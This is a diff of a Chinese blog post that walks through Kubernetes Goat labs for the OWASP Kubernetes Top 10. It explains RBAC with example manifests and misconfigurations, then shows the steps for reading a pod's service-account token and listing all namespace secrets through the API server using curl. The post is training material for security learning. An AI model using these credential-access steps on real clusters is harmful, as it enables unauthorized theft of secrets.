+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230919105703471.png" /></p>
 <p>没什么特别的信息，查看另一个： <img
-src="/img/K8s攻防之OWASP-K8S-TOP10/image-20230919110020593.png" /></p>
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230919110020593.png" /></p>
 <p>可以看到有<code>API_KEY</code>信息，即题目的flag。</p>
 <h3 id="问题原因-1">问题原因</h3>
 <p>由于该私有镜像源是开放的，因而我们可以列举已有镜像的信息，从而获得一些隐私信息，如配置过程中的KEY、软件版本等等。此外，我们也可以上传一个同名的镜像以实现供应链攻击。因此我们也要保护私有镜像源的安全性，防止供应链攻击。</p>
@@ -819,62 +820,199 @@ target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs
 Attacking private registry | Kubernetes Goat (madhuakula.com)</a></li>
 <li><a target="_blank" rel="noopener" href="https://docs.docker.com/registry/spec/api/">HTTP API V2 |
 Docker Docs</a></li>
+<li><a
+target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K02-supply-chain-vulnerabilities">K02:
+Supply Chain Vulnerabilities | OWASP Foundation</a></li>
 </ul>
 <h2 id="k03-overly-permissive-rbac">K03: Overly Permissive RBAC</h2>
 <h3 id="定义-2">定义</h3>
-<h3 id="对应k8s-goat场景">对应k8s-goat场景：</h3>
+<p>其实就是过度授权，老生常谈的问题只不过是新的场景——K8S中的RBAC（Role-Based
+Access Control
+）。K8S将资源（Pod、Service、Nodes等）和动作（get、create、delete等）绑定起来，并划分得到不同的角色身份，以此来控制权限。</p>
+<blockquote>
+<p>Configuring RBAC with least privilege enforcement is a challenge for
+reasons we will explore below.</p>
+</blockquote>
+<p>那这件事困难吗？从OWASP给的解释来看，我认为困难点在于资源数量的庞大因而导致了配置的困难：</p>
+<blockquote>
+<p>RBAC is an extremely powerful security enforcement mechanism in
+Kubernetes when appropriately configured but can quickly become a
+massive risk to the cluster and increase the blast radius in the event
+of a compromise.</p>
+</blockquote>
+<p>为了了解这部分内容，首先需要了解K8S中的RBAC。K8S的RBAC定义了四种对象：</p>
+<ul>
+<li>Role</li>
+<li>ClusterRole</li>
+<li>RoleBinding</li>
+<li>ClusterRoleBinding</li>
+</ul>
+<p>其中，前两个<code>xxxRole</code>包含了<strong>“允许”</strong>执行的操作内容（可以理解为“操作白名单”）。区别从名字大概也能判断出来：</p>
+<ul>
+<li><code>Role</code>必须定义在一个<code>Namespace</code>中，而<code>ClusterRole</code>则在整个集群中通用，因而不属于任何<code>Namespace</code>。</li>
+<li><code>ClusterRole</code>可以用于定义对Namespace资源（如Pods）、集群范围资源（如Node）、endpoint（如HTTP
+API接口）的权限，并授予其他单个命名空间和跨命名空间的访问权限；而<code>Role</code>则只作用于单个<code>Namespace</code>。</li>
+</ul>
+<p>如下是官方给的<code>Role</code>和<code>ClusterRole</code>例子：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Role</span>	<span class="comment"># 定义了一个可以访问Pods信息的Role角色</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>] <span class="comment"># &quot;&quot; indicates the core API group</span></span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;pods&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br></pre></td></tr></table></figure>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span>	<span class="comment"># 定义了一个可以访问`secrets`的ClusterRole角色</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="comment"># &quot;namespace&quot; omitted since ClusterRoles are not namespaced</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> [<span class="string">&quot;&quot;</span>]</span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># at the HTTP level, the name of the resource for accessing Secret</span></span><br><span class="line">  <span class="comment"># objects is &quot;secrets&quot;</span></span><br><span class="line">  <span class="attr">resources:</span> [<span class="string">&quot;secrets&quot;</span>]</span><br><span class="line">  <span class="attr">verbs:</span> [<span class="string">&quot;get&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;list&quot;</span>]</span><br></pre></td></tr></table></figure>
+<p>有了两个身份后，我们还有<code>RoleBinding</code>和<code>ClusterRoleBinding</code>可以基于前述两个身份对象，绑定到一个或多个用户，这样他们就拥有了对应的权限。二者区别在于前者用于授权一个<code>Namespace</code>范畴的权限，而后者可以授权整个集群范围内的。</p>
+<p>官方也给出了例子：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="comment"># This role binding allows &quot;jane&quot; to read pods in the &quot;default&quot; namespace.</span></span><br><span class="line"><span class="comment"># You need to already have a Role named &quot;pod-reader&quot; in that namespace.</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-pods</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="comment"># You can specify more than one &quot;subject&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">jane</span> <span class="comment"># &quot;name&quot; is case sensitive</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="comment"># &quot;roleRef&quot; specifies the binding to a Role / ClusterRole</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span> <span class="comment">#this must be Role or ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-reader</span> <span class="comment"># this must match the name of the Role or ClusterRole you wish to bind to</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: rbac.authorization.k8s.io/v1</span><br><span class="line"># This cluster role binding allows anyone in the &quot;manager&quot; group to read secrets in any namespace.</span><br><span class="line">kind: ClusterRoleBinding</span><br><span class="line">metadata:</span><br><span class="line">  name: read-secrets-global</span><br><span class="line">subjects:</span><br><span class="line">- kind: Group</span><br><span class="line">  name: manager # Name is case sensitive</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br><span class="line">roleRef:</span><br><span class="line">  kind: ClusterRole</span><br><span class="line">  name: secret-reader</span><br><span class="line">  apiGroup: rbac.authorization.k8s.io</span><br></pre></td></tr></table></figure>
+<p>回到问题本身。具体地，官方也给出了三个错误的案例：</p>
+<ul>
+<li><p>不必要的最高权限<code>cluster-admin</code>（Unnecessary use of
+cluster-admin）</p>
+<p>如下，将默认的最高权限用户<code>cluster-admin</code>的<code>ClusterRole</code>身份以<code>ClusterRoleBinding</code>的方式授权给了默认命名空间内的所有资源。假设一个default空间内的pod被攻陷了，那么将直接拥有集群最高的权限。</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"> <span class="attr">name:</span> <span class="string">redacted-rbac</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"> <span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line">   <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line">   <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line"> <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"> <span class="attr">name:</span> <span class="string">cluster-admin</span></span><br><span class="line"> <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure></li>
+<li><p>不必要的<code>LIST</code>权限（Unnecessary use of LIST
+permission）</p>
+<p>官方在官网中给了一段场景示例，关键部分：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kubectl create serviceaccount only-list-secrets-sa</span><br><span class="line">kubectl create role only-list-secrets-role --verb=list --resource=secrets</span><br><span class="line">kubectl create rolebinding only-list-secrets-default-ns \</span><br><span class="line">  --role=only-list-secrets-role --serviceaccount=default:only-list-secrets-sa</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建一个秘密</span></span><br><span class="line">kubectl create secret generic abc --from-literal=secretAuthToken=verySecure123</span><br></pre></td></tr></table></figure>
+<p>首先创建了一个服务账户<code>only-list-secrets-sa</code>并创建了包含<code>LIST</code>权限的<code>only-list-secrets-role</code>，然后创建了名为<code>noly-olist-secrest-default-ns</code>的<code>rolebingding</code>将<code>only-list-secrets-role</code>授予了默认命名空间内的服务账户<code>only-list-secrets-sa</code>。</p>
+<p>由于该服务账户没有<code>GET</code>权限，因此可以验证无法读取秘密：</p>
+<p><img
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920121608994.png" /></p>
+<p>然而由于<code>LIST</code>权限的存在，使得可以列出所有的信息：</p>
+<p><img
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920121644503.png" /></p>
+<p>由于创建<code>Role</code>时候增加了<code>list</code>权限，从而导致攻击者可以利用该权限列出对应命名空间内所有数据：</p>
+<blockquote>
+<p>Accounts with <code>LIST</code> permission cannot get a specific item
+from the API, but will get all of them in full when they list.</p>
+</blockquote></li>
+<li><p>不必要的<code>WATCH</code>权限（Unnecessary use of WATCH
+permission）</p>
+<p>和<code>LIST</code>类似，<code>WATCH</code>也可以查看所有数据：</p>
+<blockquote>
+<p>kubectl create role only-watch-secrets-role --verb=watch
+--resource=secrets</p>
+</blockquote></li>
+</ul>
+<h3
+id="对应k8s-goat场景rbac-least-privileges-misconfiguration">对应k8s-goat场景：RBAC
+least privileges misconfiguration</h3>
+<blockquote>
+<p>该攻击方法从战术上属于<code>Credential Access</code>，技术上包含<code>List K8S secrets</code>和<code>Container service account</code>。</p>
+</blockquote>
+<p>下面正式分析，首先访问对应端口：</p>
+<p><img
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920154727364.png" /></p>
+<p>是一个网页版的shell，对应命名空间<code>big-monolith</code>下的应用<code>hunger-check</code>。根据场景介绍，我们的目标是获取<code>k8s_goat_flag</code>，其位于<code>k8svaultapikey</code>中。</p>
+<h3 id="预备知识">预备知识</h3>
+<p>对于k8s环境中存在的pod，我们怎么从pod内部使用到k8s的API呢？官方提供了四种方式。</p>
+<ul>
+<li><p>使用官方的k8s客户端：类似DIND，可以下载使用官方的k8s客户端。</p></li>
+<li><p>直接访问RESTful API：</p>
+<ul>
+<li><p>环境变量中存在<code>KUBERNETES_SERVICE_HOST</code>和<code>KUBERNETES_SERVICE_PORT_HTTPS</code>。且k8s也在集群中部署了名为<code>kubernetes</code>的服务，提供<code>kubernetes.default.svc</code>到API服务器的域名解析服务。</p></li>
+<li><p>官方推荐使用<code>ServiceAccount</code>来认证使用API，如：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义ServiceAccount</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ServiceAccount</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">build-robot</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用ServiceAccont定义pod</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-pod</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">serviceAccountName:</span> <span class="string">build-robot</span></span><br></pre></td></tr></table></figure>
+<p>若以这种方式，则k8s会在pod中创建：</p>
+<ul>
+<li><code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>：认证token</li>
+<li><code>/var/run/secrets/kubernetes.io/serviceaccount/ca.crt</code>：证书</li>
+<li><code>/var/run/secrets/kubernetes.io/serviceaccount/namespace</code>：使用API时默认的namespace</li>
+</ul>
+<p>这种情况下，pod内容器就可以使用配置文件定义好的<code>ServiceAccount</code>权限去访问<code>kubernetes.default.svc</code>了。</p></li>
+</ul></li>
+<li><p>使用kubectl proxy：使用该命令开启一个sidecar模式的pod，kubectl
+proxy在pod内开启一个监听端口并负责与API服务器进行认证，因而该pod内的所有容器就可以通过该端口访问API服务了</p></li>
+<li><p>直接传递认证token：和第二种有点类似，只不过我们是手动传递的token，一个简单脚本如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置API服务器的域名，域名解析会由kubernets服务执行</span></span><br><span class="line">APISERVER=https://kubernetes.default.svc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置ServiceAccount文件的路径</span></span><br><span class="line">SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取Pod的namespace、token、证书</span></span><br><span class="line">NAMESPACE=$(cat $&#123;SERVICEACCOUNT&#125;/namespace)</span><br><span class="line">TOKEN=$(cat $&#123;SERVICEACCOUNT&#125;/token)</span><br><span class="line">CACERT=$&#123;SERVICEACCOUNT&#125;/ca.crt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问api</span></span><br><span class="line">curl --cacert $&#123;CACERT&#125; --header &quot;Authorization: Bearer $&#123;TOKEN&#125;&quot; -X GET $&#123;APISERVER&#125;/api</span><br></pre></td></tr></table></figure></li>
+</ul>
 <h3 id="利用-2">利用</h3>
+<p>那先找k8s
+api的服务器地址嘛，不然怎么用API。从环境变量中可以看到：</p>
+<p><img
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920154850178.png" /></p>
+<p>好，可以用，但是我们怎么知道这个pod对应的服务账号呢？这里选用前述预备知识中<strong>直接传递认证token</strong>的方式。进入<code>/var/run/</code>目录可以看到一个<code>secrets</code>目录，其下就是token、证书和默认namespace了：</p>
+<p><img
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920154914501.png" /></p>
+<p>然后我们基于这三个内容以及前面环境变量中看到的地址来访问API：</p>
+<p><img
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920155154243.png" /></p>
+<p>可以看到访问成功，<code>curl --cacert $&#123;CACRT&#125; --header "Authorization: Bearer $&#123;TOKEN&#125;" -X GET $&#123;APISERVER&#125;/api/v1</code>查看有哪些资源：</p>
+<p><img src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920153859379.png" style="zoom:60%;" /></p>
+<p>可以找到一个叫<code>secrets</code>的资源，尝试访问<code>curl --cacert $&#123;CACRT&#125; --header "Authorization: Bearer $&#123;TOKEN&#125;" -X GET $&#123;APISERVER&#125;/api/v1/secrets</code>：</p>
+<p><img
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920155612132.png" /></p>
+<p>不能直接访问，但发现该资源拥有list和watch权限，那么就想到了利用list或watch的方法来读取全部信息，这里使用list。<strong>在v1后加上命名空间的路径，即v1/namespace/${NAMESPACE}/secrets</strong>：</p>
+<p><img
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920155724794.png" /></p>
+<p><strong>可以看到，我们虽然没有权限访问secrets下的某个条目，但是我们可以利用LIST直接把所有信息都列举出来</strong>，最后找到题目所需关键字并解码：</p>
+<p><img
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920160129910.png" /></p>
+<blockquote>
+<p>更多k8s RESTful API的使用：<a
+target="_blank" rel="noopener" href="https://kubernetes.io/docs/reference/kubernetes-api/">Kubernetes
+API | Kubernetes</a></p>
+</blockquote>
 <h3 id="问题原因-2">问题原因</h3>
+<p>去看一下配置文件：</p>
+<p><img
+src="/img/K8s攻防之OWASP-K8S-TOP10（上）/image-20230920160901020.png" /></p>
 <h3 id="参考学习-2">参考学习</h3>
+<ul>
+<li><a
+target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-16/rbac-least-privileges-misconfiguration-in-kubernetes-cluster/welcome">⎈
+RBAC least privileges misconfiguration | Kubernetes Goat
+(madhuakula.com)</a></li>
+<li><a
+target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K03-overly-permissive-rbac">K03:
+Overly Permissive RBAC | OWASP Foundation</a></li>
+<li><a
+target="_blank" rel="noopener" href="https://kubernetes.io/docs/reference/access-authn-authz/rbac/">Using
+RBAC Authorization | Kubernetes</a></li>
+<li><a
+target="_blank" rel="noopener" href="https://kubernetes.io/docs/concepts/security/rbac-good-practices/">Role
+Based Access Control Good Practices | Kubernetes</a></li>
+<li><a
+target="_blank" rel="noopener" href="https://kubernetes.io/docs/tasks/run-application/access-api-from-pod/">Accessing
+the Kubernetes API from a Pod | Kubernetes</a></li>
+<li><a
+target="_blank" rel="noopener" href="https://kubernetes.io/docs/reference/kubernetes-api/">Kubernetes
+API | Kubernetes</a></li>
+</ul>
 <h2 id="k04-lack-of-centralized-policy-enforcement">K04: Lack of
 Centralized Policy Enforcement</h2>
 <h3 id="定义-3">定义</h3>
-<h3 id="对应k8s-goat场景-1">对应k8s-goat场景：</h3>
+<h3
+id="对应k8s-goat场景securing-kubernetes-clusters-using-kyverno-policy-engine">对应k8s-goat场景：Securing
+Kubernetes Clusters using Kyverno Policy Engine</h3>
+<p>下图为官方的攻击场景示意图，初步判断该通过名为<code>Kyverno</code>的策略引擎抵挡了攻击者的命令执行。</p>
+<figure>
+<img
+src="https://madhuakula.com/kubernetes-goat/assets/images/scenario-22-1d2c06a0672c48504caadc55568323d4.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <h3 id="利用-3">利用</h3>
 <h3 id="问题原因-3">问题原因</h3>
 <h3 id="参考学习-3">参考学习</h3>
+<ul>
+<li><a
+target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-22/securing-kubernetes-clusters-using-kyverno-policy-engine/welcome">⎈
+Securing Kubernetes Clusters using Kyverno Policy Engine | Kubernetes
+Goat (madhuakula.com)</a></li>
+<li><a
+target="_blank" rel="noopener" href="https://owasp.org/www-project-kubernetes-top-ten/2022/en/src/K04-policy-enforcement">K04:
+Policy Enforcement | OWASP Foundation</a></li>
+</ul>
 <h2 id="k05-inadequate-logging-and-monitoring">K05: Inadequate Logging
 and Monitoring</h2>
 <h3 id="定义-4">定义</h3>
-<h3 id="对应k8s-goat场景-2">对应k8s-goat场景：</h3>
+<h3 id="对应k8s-goat场景">对应k8s-goat场景：</h3>
 <h3 id="利用-4">利用</h3>
 <h3 id="问题原因-4">问题原因</h3>
 <h3 id="参考学习-4">参考学习</h3>
-<h2 id="k06-broken-authentication-mechanisms">K06: Broken Authentication
-Mechanisms</h2>
-<h3 id="定义-5">定义</h3>
-<h3 id="对应k8s-goat场景-3">对应k8s-goat场景：</h3>
-<h3 id="利用-5">利用</h3>
-<h3 id="问题原因-5">问题原因</h3>
-<h3 id="参考学习-5">参考学习</h3>
-<h2 id="k07-missing-network-segmentation-controls">K07: Missing Network
-Segmentation Controls</h2>
-<h3 id="定义-6">定义</h3>
-<h3 id="对应k8s-goat场景-4">对应k8s-goat场景：</h3>
-<h3 id="利用-6">利用</h3>
-<h3 id="问题原因-6">问题原因</h3>
-<h3 id="参考学习-6">参考学习</h3>
-<h2 id="k08-secrets-management-failures">K08: Secrets Management
-Failures</h2>
-<h3 id="定义-7">定义</h3>
-<h3 id="对应k8s-goat场景-5">对应k8s-goat场景：</h3>
-<h3 id="利用-7">利用</h3>
-<h3 id="问题原因-7">问题原因</h3>
-<h3 id="参考学习-7">参考学习</h3>
-<h2 id="k09-misconfigured-cluster-components">K09: Misconfigured Cluster
-Components</h2>
-<h3 id="定义-8">定义</h3>
-<h3 id="对应k8s-goat场景-6">对应k8s-goat场景：</h3>
-<h3 id="利用-8">利用</h3>
-<h3 id="问题原因-8">问题原因</h3>
-<h3 id="参考学习-8">参考学习</h3>
-<h2 id="k10-outdated-and-vulnerable-kubernetes-components">K10: Outdated
-and Vulnerable Kubernetes Components</h2>
-<h3 id="定义-9">定义</h3>
-<h3 id="对应k8s-goat场景-7">对应k8s-goat场景：</h3>
-<h3 id="利用-9">利用</h3>
-<h3 id="问题原因-9">问题原因</h3>
-<h3 id="参考学习-9">参考学习</h3>
+<ul>
+<li><a
+target="_blank" rel="noopener" href="https://madhuakula.com/kubernetes-goat/docs/scenarios/scenario-21/ebpf-runtime-security-monitoring-and-detection-in-kubernetes-cluster-using-cilium-tetragon/welcome">⎈
+Cilium Tetragon - eBPF-based Security Observability and Runtime
+Enforcement | Kubernetes Goat (madhuakula.com)</a></li>
+</ul>
 
     </article>
     <!-- license -->
@@ -883,7 +1021,7 @@ and Vulnerable Kubernetes Components</h2>
             <p>原文作者：<a href="https://lzwgiter.github.io">lzwgiter</a>
             <p>原文链接：<a href="https://lzwgiter.github.io/posts/8aa36aba.html">https://lzwgiter.github.io/posts/8aa36aba.html</a>
             <p>发表日期：<a href="https://lzwgiter.github.io/posts/8aa36aba.html">September 16th 2023, 3:25:21 pm</a>
-            <p>更新日期：<a href="https://lzwgiter.github.io/posts/8aa36aba.html">September 19th 2023, 11:20:49 am</a>
+            <p>更新日期：<a href="https://lzwgiter.github.io/posts/8aa36aba.html">September 20th 2023, 4:32:56 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -1060,14 +1198,11 @@ and Vulnerable Kubernetes Components</h2>
 Configurations</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">3.1.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94k8s-goat%E5%9C%BA%E6%99%AFdind-docker-in-docker-exploitation"><span class="toc-number">3.1.2.</span> <span class="toc-text">对应k8s-goat场景：DIND
 (docker-in-docker) exploitation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86%E5%85%B3%E4%BA%8Edocker.sock"><span class="toc-number">3.1.3.</span> <span class="toc-text">预备知识：关于docker.sock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.1.4.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0"><span class="toc-number">3.1.5.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0"><span class="toc-number">3.1.6.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#k02-supply-chain-vulnerabilities"><span class="toc-number">3.2.</span> <span class="toc-text">K02: Supply Chain
 Vulnerabilities</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94k8s-goat%E5%9C%BA%E6%99%AFattacking-private-registry"><span class="toc-number">3.2.2.</span> <span class="toc-text">对应k8s-goat场景：Attacking
-private registry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86%E5%85%B3%E4%BA%8Edocker-registry"><span class="toc-number">3.2.3.</span> <span class="toc-text">预备知识：关于docker registry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">3.2.4.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0-1"><span class="toc-number">3.2.5.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-1"><span class="toc-number">3.2.6.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#k03-overly-permissive-rbac"><span class="toc-number">3.3.</span> <span class="toc-text">K03: Overly Permissive RBAC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BA%94k8s-goat%E5%9C%BA%E6%99%AF"><span class="toc-number">3.3.2.</span> <span class="toc-text">对应k8s-goat场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">3.3.3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0-2"><span class="toc-number">3.3.4.</span> <span class="toc-text">问题原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E5%AD%A6%E4%B9%A0-2"><span class="toc-number">3.3.5.</span> <span class="toc-text">参考学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#k04-lack-of-centralized-policy-enforcement"><span class="toc-number">3.4.</span> <span class="toc-text">K04: Lack of
